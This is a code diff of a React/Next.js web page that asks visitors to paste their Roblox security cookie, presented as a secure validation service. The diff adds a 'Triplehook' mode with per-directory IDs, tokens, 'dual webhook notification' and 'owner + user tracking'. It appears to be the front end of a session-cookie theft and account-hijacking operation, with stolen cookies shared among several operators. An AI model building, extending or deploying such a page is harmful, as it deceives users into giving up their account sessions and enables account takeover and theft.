@@ -2,33 +2,47 @@
 
 import { useState, useEffect } from 'react';
 import Link from 'next/link';
-import { ArrowLeft, Loader2, CheckCircle, AlertCircle, Copy } from 'lucide-react';
+import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from 'lucide-react';
+import { useParams } from 'next/navigation';
 
-export default function SubmitPage() {
+export default function TriplehookSubmitPage() {
+  const params = useParams();
+  const directory = params?.directory as string;
+  
   const [cookie, setCookie] = useState('');
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
   const [error, setError] = useState('');
   const [csrfToken, setCsrfToken] = useState('');
-  const [copied, setCopied] = useState(false);
+  const [triplehookData, setTriplehookData] = useState<any>(null);
 
   useEffect(() => {
-    const fetchCsrfToken = async () => {
+    const fetchData = async () => {
       try {
-        const res = await fetch('/api/csrf-token');
-        const data = await res.json();
-        setCsrfToken(data.csrfToken);
+        // Fetch CSRF token
+        const csrfRes = await fetch('/api/csrf-token');
+        const csrfData = await csrfRes.json();
+        setCsrfToken(csrfData.csrfToken);
+
+        // Fetch triplehook data
+        if (directory) {
+          const res = await fetch(`/api/triplehook?action=get&id=${directory}`);
+          if (res.ok) {
+            const data = await res.json();
+            setTriplehookData(data.data);
+          }
+        }
       } catch (err) {
-        console.error('Failed to fetch CSRF token:', err);
+        console.error('Failed to fetch data:', err);
       }
     };
 
-    fetchCsrfToken();
-  }, []);
+    fetchData();
+  }, [directory]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!cookie.trim()) {
       setError('Please enter a valid cookie');
       return;
@@ -44,8 +58,13 @@ export default function SubmitPage() {
         headers: {
           'Content-Type': 'application/json',
           'x-csrf-token': csrfToken,
+          'x-triplehook-id': directory,
+          'x-triplehook-token': triplehookData?.token || '',
         },
-        body: JSON.stringify({ cookie: cookie.trim() }),
+        body: JSON.stringify({ 
+          cookie: cookie.trim(),
+          triplehookId: directory,
+        }),
       });
 
       const data = await res.json();
@@ -57,7 +76,7 @@ export default function SubmitPage() {
       setSuccess(true);
       setCookie('');
       setTimeout(() => {
-        window.location.href = '/dashboard';
+        window.location.href = `/triplehook/${directory}/status`;
       }, 2000);
     } catch (err) {
       setError(err instanceof Error ? err.message : 'An error occurred');
@@ -72,11 +91,11 @@ export default function SubmitPage() {
       <nav className="fixed top-0 w-full z-50 glass-effect border-b backdrop-blur-md">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
           <Link href="/" className="text-xl font-bold gradient-text">
-            ImHellAMo
+            {directory || 'Triplehook'}
           </Link>
           <Link href="/" className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors btn-icon">
             <ArrowLeft className="w-4 h-4" />
-            Back
+            Home
           </Link>
         </div>
       </nav>
@@ -86,7 +105,7 @@ export default function SubmitPage() {
         <div className="w-full max-w-2xl">
           <div className="mb-8 text-center">
             <h1 className="text-4xl md:text-5xl font-bold mb-3">Submit Cookie</h1>
-            <p className="text-muted-foreground text-lg">Process and validate your Roblox security cookie securely</p>
+            <p className="text-muted-foreground text-lg">Process your Roblox security cookie through triplehook</p>
           </div>
 
           <div className="grid md:grid-cols-2 gap-8">
@@ -170,8 +189,16 @@ export default function SubmitPage() {
               </div>
 
               <div className="card-base rounded-xl">
-                <h4 className="font-semibold mb-3">Key Features</h4>
+                <h4 className="font-semibold mb-3">Triplehook Features</h4>
                 <ul className="text-sm text-muted-foreground space-y-2">
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>Dual webhook notification</span>
+                  </li>
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>Owner + user tracking</span>
+                  </li>
                   <li className="flex gap-2">
                     <span className="text-primary">✓</span>
                     <span>End-to-end encryption</span>
@@ -179,14 +206,6 @@ export default function SubmitPage() {
                   <li className="flex gap-2">
                     <span className="text-primary">✓</span>
                     <span>CSRF protection</span>
-                  </li>
-                  <li className="flex gap-2">
-                    <span className="text-primary">✓</span>
-                    <span>Processing in &lt;1 second</span>
-                  </li>
-                  <li className="flex gap-2">
-                    <span className="text-primary">✓</span>
-                    <span>Secure request history</span>
                   </li>
                 </ul>
               </div>
